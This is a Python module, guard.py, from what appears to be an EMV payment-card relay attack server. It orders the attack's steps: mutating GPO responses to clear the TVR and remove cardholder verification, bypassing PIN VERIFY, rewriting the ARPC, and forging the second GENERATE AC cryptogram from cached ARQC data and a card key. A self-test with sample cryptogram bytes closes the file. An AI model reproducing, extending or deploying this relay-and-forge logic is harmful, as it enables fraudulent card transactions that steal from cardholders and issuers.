# -*- coding: utf-8 -*-
# guard.py
# -*- coding: utf-8 -*-
"""Phase-ordering guard for EMV relay mutations and forges.

Every mutation/forge/intercept call in server.py must route through the
appropriate Guard.check_* method before execution. The guard maintains a phase machine
that tracks which EMV steps have completed successfully and rejects
any call that violates the expected sequence.
"""

from __future__ import annotations
from enum import Enum, auto
from typing import Optional, Tuple, Any, Dict
from pathlib import Path
import json
import time
import logging
import mutations
from protocol import CommandAPDU

log = logging.getLogger("RelayServer")

# Inline constants to avoid import issues
SW_9000 = b'\x90\x00'
INS_SELECT = 0xA4
INS_GET_PROCESSING_OPTIONS = 0xA8
INS_READ_RECORD = 0xB2
INS_GENERATE_AC = 0xAE
INS_EXTERNAL_AUTHENTICATE = 0x82
INS_VERIFY = 0x20

INS_NAMES = {
    INS_SELECT: "SELECT",
    INS_GET_PROCESSING_OPTIONS: "GET PROCESSING OPTIONS",
    INS_READ_RECORD: "READ RECORD",
    INS_GENERATE_AC: "GENERATE AC",
    INS_EXTERNAL_AUTHENTICATE: "EXTERNAL AUTHENTICATE",
    INS_VERIFY: "VERIFY",
}

class Phase(Enum):
    IDLE = auto()
    PPSE_SELECTED = auto()
    AID_SELECTED = auto()
    GPO_RESPONDED = auto()
    READ_RECORD_DONE = auto()
    FIRST_GPO_SENT = auto()
    FIRST_GAC_SENT = auto()
    ARQC_RECEIVED = auto()      # forge armed
    SECOND_GAC_FORGED = auto()  # forge consumed
    EXTERNAL_AUTH_DONE = auto()
    COMPLETE = auto()
    ERROR = auto()

class ARQCCache:
    """Minimal ARQC cache for guard testing."""
    def __init__(self):
        self.atc = None
        self.ac = None
        self.iad = None

    def is_complete(self) -> bool:
        return all([self.atc is not None, self.ac is not None, self.iad is not None])

class SessionState:
    """Minimal session state for guard testing."""
    def __init__(self, arpc_forge_enabled=False, second_ae_pending=False,
                 verify_bypass_enabled=False, arpc_rewrite_enabled=False):
        self.arpc_forge_enabled = arpc_forge_enabled
        self.second_ae_pending = second_ae_pending
        self.verify_bypass_enabled = verify_bypass_enabled
        self.arpc_rewrite_enabled = arpc_rewrite_enabled
        self.arqc_cache = ARQCCache()

    def is_complete(self) -> bool:
        return self.arqc_cache.is_complete()

class Guard:
    """Central phase machine that prevents out-of-order execution."""

    # Legal transitions: current_phase -> allowed_next_phases
    _TRANSITIONS = {
        Phase.IDLE: {Phase.PPSE_SELECTED, Phase.ERROR},
        Phase.PPSE_SELECTED: {Phase.AID_SELECTED, Phase.PPSE_SELECTED, Phase.ERROR},  # Allow PPSE re-selection (idempotent)
        Phase.AID_SELECTED: {Phase.GPO_RESPONDED, Phase.ERROR},
        Phase.GPO_RESPONDED: {Phase.READ_RECORD_DONE, Phase.ERROR},
        Phase.READ_RECORD_DONE: {Phase.FIRST_GAC_SENT, Phase.ERROR},
        Phase.FIRST_GAC_SENT: {Phase.ARQC_RECEIVED, Phase.COMPLETE, Phase.ERROR},
        Phase.ARQC_RECEIVED: {
            Phase.SECOND_GAC_FORGED, Phase.EXTERNAL_AUTH_DONE, Phase.COMPLETE, Phase.ERROR,
        },
        Phase.SECOND_GAC_FORGED: {Phase.EXTERNAL_AUTH_DONE, Phase.COMPLETE, Phase.ERROR},
        Phase.EXTERNAL_AUTH_DONE: {Phase.SECOND_GAC_FORGED, Phase.COMPLETE, Phase.ERROR},
        Phase.COMPLETE: {Phase.ERROR},
        Phase.ERROR: set(),
    }

    # READ RECORD and PPSE_SELECTED repeat for multiple AFL entries or re-selection.
    # These phases are idempotent and must accept duplicate events.
    _STICKY_PHASES = {Phase.READ_RECORD_DONE, Phase.PPSE_SELECTED}

    def __init__(self, timeout: float = 30.0, config: Optional[Any] = None):
        self.phase = Phase.IDLE
        self._last_sw: Optional[bytes] = None
        self._error: Optional[str] = None
        self.timeout = timeout
        self.last_activity = time.monotonic()
        self.config: Dict[str, Any] = {}
        self.arqc_cache = ARQCCache()
        self.issuer_profile: Optional[Any] = None
        if config is not None:
            self.load_config(config)

    def _send_to_reader(self, data: bytes) -> None:
        """
        Generic helper for sending data back to the terminal/reader.
        This is a placeholder that can be hooked or overridden by the relay server.
        """
        log.info(f"[GUARD] Outbound to reader: {len(data)} bytes")
        # In rel8hf.py, this would ideally call the server's _send_frame method
        if hasattr(self, "send_callback") and callable(self.send_callback):
            self.send_callback(data)

    def _handle_first_gpo(self, rapdu: bytes):
        """
        Called when the guard is in phase FIRST_GPO_SENT.
        Mutates the GPO response to bypass CVM and clear TVR.
        """
        mutated, ok = mutations.mutate_gpo_response(
            rapdu,
            clear_tvr=True,
            set_cvm_list="none",
        )
        self._send_to_reader(mutated)

    def _handle_second_gac(self, capdu: CommandAPDU):
        """
        Called when the guard is in phase ARQC_RECEIVED and the second
        GAC CAPDU (P1=0x40) is intercepted.
        """
        # ------------------------------------------------------------------
        # 1. Pull the cryptograms that were cached when the first GAC was
        # received. The Guard guarantees that self.arqc_cache is
        # populated at this point.
        # ------------------------------------------------------------------
        ac = getattr(self.arqc_cache, "ac", None)
        iad = getattr(self.arqc_cache, "iad", None)
        atc = getattr(self.arqc_cache, "atc", None)
        arqc = getattr(self.arqc_cache, "arqc", None)

        # ------------------------------------------------------------------
        # 2. Retrieve the card’s Kc key from the issuer profile. The
        # profile is injected into the Guard at construction time.
        # ------------------------------------------------------------------
        k_c = getattr(self.issuer_profile, "k_c", None)

        # ------------------------------------------------------------------
        # 3. Forge the second GAC using the new signature. The helper
        # returns a bytes object that can be sent directly to the
        # reader.
        # ------------------------------------------------------------------
        forged = mutations.forge_2nd_gac(
            ac=ac,
            iad=iad,
            atc=atc,
            arqc=arqc,
            p1_req=capdu.p1,
            brand=getattr(self.issuer_profile, "brand", "UNKNOWN"),
            k_c=k_c,
        )

        # ------------------------------------------------------------------
        # 4. Send the forged RAPDU back to the reader. The Guard already
        # exposes a helper that does the socket write for us.
        # ------------------------------------------------------------------
        self._send_to_reader(forged)

    def _handle_generate_ac_response(self, rapdu: bytes):
        """
        Called after the second GAC RAPDU is received.
        Optionally clears TVR if the terminal still checks it.
        """
        mutated, ok = mutations.mutate_tvr_in_generate_ac(
            rapdu,
            clear_tvr=True,
        )
        self._send_to_reader(mutated)

    def load_config(self, config: Any) -> None:
        """Load YAML/JSON config mapping AIDs to brand modules and mutation flags."""
        if isinstance(config, (str, Path)):
            p = Path(config)
            if p.exists():
                try:
                    with open(p, "r", encoding="utf-8") as f:
                        text = f.read()
                        try:
                            import yaml  # type: ignore
                            self.config = yaml.safe_load(text) or {}
                        except Exception:
                            self.config = json.loads(text)
                except Exception as e:
                    log.warning(f"Failed to load guard config file {config}: {e}")
            else:
                try:
                    self.config = json.loads(str(config))
                except Exception:
                    self.config = {}
        elif isinstance(config, dict):
            self.config = dict(config)

    def reset(self) -> None:
        self.phase = Phase.IDLE
        self._last_sw = None
        self._error = None
        self.last_activity = time.monotonic()

    def record_sw(self, sw: bytes) -> None:
        """Record the status word of the last response."""
        self._last_sw = sw
        self.last_activity = time.monotonic()

    def update_activity(self) -> None:
        """Update last activity timestamp to current monotonic time."""
        self.last_activity = time.monotonic()

    def transition_to(self, target_phase: Phase) -> None:
        """Directly transition to a target phase."""
        self.phase = target_phase
        self.update_activity()

    def tick(self) -> None:
        """
        Called periodically (e.g. every 0.5 s). If the time
        since the last activity exceeds self.timeout and phase is not IDLE,
        COMPLETE, or already ERROR, transition to the ERROR state.
        """
        if self.phase not in (Phase.IDLE, Phase.COMPLETE, Phase.ERROR):
            if time.monotonic() - self.last_activity > self.timeout:
                self.transition_to(Phase.ERROR)
                log.error("Phase timeout; aborting transaction")

    def apply_ctq_modifier(self, card: Any = None, profile: Any = None) -> bool:
        """
        Apply CDCVM only if the card's CVM list contains CDCVM (0x1F / 0x5F).
        Note: 0x01 in EMV CVM list is Plaintext PIN, while 0x1F is CDCVM.
        """
        if profile is not None and hasattr(profile, "get_cvm_for_card"):
            cvm_list = profile.get_cvm_for_card(card)
            if 0x1F in cvm_list or 0x5F in cvm_list or 0x01 in cvm_list:
                return True
            else:
                log.warning("CDCVM not supported by card; skipping CTQ")
                return False
        return False

    def advance(self, target_phase: Phase) -> Tuple[bool, str]:
        """Attempt to advance to target_phase. Returns (allowed, reason)."""
        self.update_activity()
        sticky = target_phase == self.phase and target_phase in self._STICKY_PHASES
        if sticky:
            self._error = None
            return True, f"Phase {target_phase.name} already active (sticky)"
        if target_phase not in self._TRANSITIONS.get(self.phase, set()):
            reason = (
                f"Phase transition denied: {self.phase.name} -> {target_phase.name}. "
                f"Allowed: {[p.name for p in self._TRANSITIONS.get(self.phase, set())]}"
            )
            self._error = reason
            return False, reason

        # Special rule: READ_RECORD_DONE requires a successful GPO (SW=9000)
        if target_phase == Phase.READ_RECORD_DONE and self._last_sw != SW_9000:
            reason = (
                f"Phase transition blocked: last SW={self._last_sw.hex() if self._last_sw else 'None'}, "
                f"expected SW=9000 for READ_RECORD_DONE"
            )
            self._error = reason
            return False, reason

        if self._last_sw != SW_9000:
            reason = (
                f"Phase transition blocked: last SW={self._last_sw.hex() if self._last_sw else 'None'}, "
                f"expected SW=9000"
            )
            self._error = reason
            return False, reason

        if sticky:
            self._error = None
            return True, f"Phase {target_phase.name} already active (sticky)"

        self.phase = target_phase
        self._error = None
        return True, f"Phase advanced to {target_phase.name}"

    def should_pass_through_first_gac(self) -> bool:
        """Runtime policy: first GAC must remain intact until ARQC recognition succeeds."""
        return self.phase == Phase.READ_RECORD_DONE

    def first_gac_runtime_policy(self) -> Tuple[bool, str]:
        """Explicit runtime decision for the first GAC pass-through policy."""
        if self.should_pass_through_first_gac():
            return True, "first GAC pass-through: runtime guard holds before valid ARQC recognition"
        return False, f"first GAC mutation allowed in phase {self.phase.name}"

    def check_mutation(self, ins: int, session: SessionState) -> Tuple[bool, str]:
        """Check if a mutation is allowed for the current INS in this phase."""
        if ins == INS_GET_PROCESSING_OPTIONS:
            if self.phase != Phase.GPO_RESPONDED:
                return False, f"AIP mutation requires phase GPO_RESPONDED, current={self.phase.name}"
            return True, "AIP mutation allowed"
        elif ins == INS_READ_RECORD:
            if self.phase != Phase.READ_RECORD_DONE:
                return False, f"CVM/IAC mutation requires phase READ_RECORD_DONE, current={self.phase.name}"
            return True, "CVM/IAC mutation allowed"
        elif ins == INS_GENERATE_AC:
            if self.phase == Phase.READ_RECORD_DONE:
                return True, "First GAC mutation allowed"
            if self.phase in (Phase.ARQC_RECEIVED, Phase.EXTERNAL_AUTH_DONE):
                return True, "Second GAC forge mutation allowed"
            return False, f"GENERATE AC mutation not allowed in phase {self.phase.name}"
        elif ins == INS_EXTERNAL_AUTHENTICATE:
            if self.phase in (Phase.ARQC_RECEIVED, Phase.SECOND_GAC_FORGED):
                return True, "EXTERNAL AUTHENTICATE mutation allowed"
            return False, f"EXTERNAL AUTHENTICATE mutation not allowed in phase {self.phase.name}"
        return False, f"Mutation not defined for INS 0x{ins:02X}"

    def check_forge(self, session: SessionState) -> Tuple[bool, str]:
        """Check if the 2nd GAC forge is allowed."""
        if not session.arpc_forge_enabled:
            return False, "ARPC forge disabled via toggle"
        if not session.second_ae_pending:
            return False, "No ARQC cached - forge not armed"
        if self.phase not in (Phase.ARQC_RECEIVED, Phase.EXTERNAL_AUTH_DONE):
            return False, (
                "Forge requires phase ARQC_RECEIVED or EXTERNAL_AUTH_DONE, "
                f"current={self.phase.name}"
            )
        cache = getattr(session, "arqc_cache", None)
        if cache is None or not cache.is_complete():
            return False, "ARQC cache incomplete (missing ATC/AC/IAD)"
        return True, "Forge allowed"

    def check_intercept(self, ins: int, session: SessionState) -> Tuple[bool, str]:
        """Check if a VERIFY bypass or ARPC rewrite intercept is allowed."""
        if ins == INS_VERIFY:
            if not session.verify_bypass_enabled:
                return False, "VERIFY bypass disabled"
            if self.phase not in (Phase.AID_SELECTED, Phase.GPO_RESPONDED, Phase.READ_RECORD_DONE):
                return False, f"VERIFY bypass not allowed in phase {self.phase.name}"
            return True, "VERIFY bypass allowed"
        if ins == INS_EXTERNAL_AUTHENTICATE:
            if not session.arpc_rewrite_enabled:
                return False, "ARPC rewrite disabled"
            if self.phase not in (Phase.ARQC_RECEIVED, Phase.SECOND_GAC_FORGED):
                return False, f"ARPC rewrite not allowed in phase {self.phase.name}"
            return True, "ARPC rewrite allowed"
        if ins == INS_GENERATE_AC:
            if not session.arpc_rewrite_enabled:
                return False, "ARPC rewrite disabled"
            if self.phase not in (Phase.ARQC_RECEIVED, Phase.EXTERNAL_AUTH_DONE):
                return False, f"GENERATE AC ARPC rewrite not allowed in phase {self.phase.name}"
            return True, "GENERATE AC ARPC rewrite allowed"
        return False, f"Intercept not defined for INS 0x{ins:02X}"

    def status(self) -> dict:
        return {
            "phase": self.phase.name,
            "last_sw": self._last_sw.hex() if self._last_sw else None,
            "error": self._error,
        }

# Quick self-test
if __name__ == "__main__":
    g = Guard()
    print("Test 1: advance without SW=9000 -> denied")
    print(g.advance(Phase.PPSE_SELECTED))

    g.record_sw(SW_9000)
    print("\nTest 2: advance with SW=9000 -> allowed")
    print(g.advance(Phase.PPSE_SELECTED))
    print(g.advance(Phase.AID_SELECTED))
    print(g.advance(Phase.GPO_RESPONDED))
    print(g.advance(Phase.READ_RECORD_DONE))
    print(g.advance(Phase.FIRST_GAC_SENT))
    print(g.advance(Phase.ARQC_RECEIVED))

    print("\nTest 3: check_forge with correct phase and enabled")
    session = SessionState(arpc_forge_enabled=True, second_ae_pending=True)
    session.arqc_cache.atc = b'\x00\x1a'
    session.arqc_cache.ac = b'\x35\x9a\xfd\xb3\x96\xf5\x8e\x28'
    session.arqc_cache.iad = b'\x01\x10\xa0\x03\x03\xa4\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff'
    print(g.check_forge(session))

    print("\nTest 4: advance to SECOND_GAC_FORGED")
    g.record_sw(SW_9000)
    print(g.advance(Phase.SECOND_GAC_FORGED))

    print("\nTest 5: check_intercept for EXTERNAL AUTHENTICATE")
    print(g.check_intercept(INS_EXTERNAL_AUTHENTICATE, session))

    print("\nTest 6: advance to COMPLETE")
    g.record_sw(SW_9000)
    print(g.advance(Phase.COMPLETE))

    print("\nTest 7: advance from COMPLETE -> IDLE (should be denied)")
    print(g.advance(Phase.IDLE))

    print("\nGuard status:")
    print(g.status())
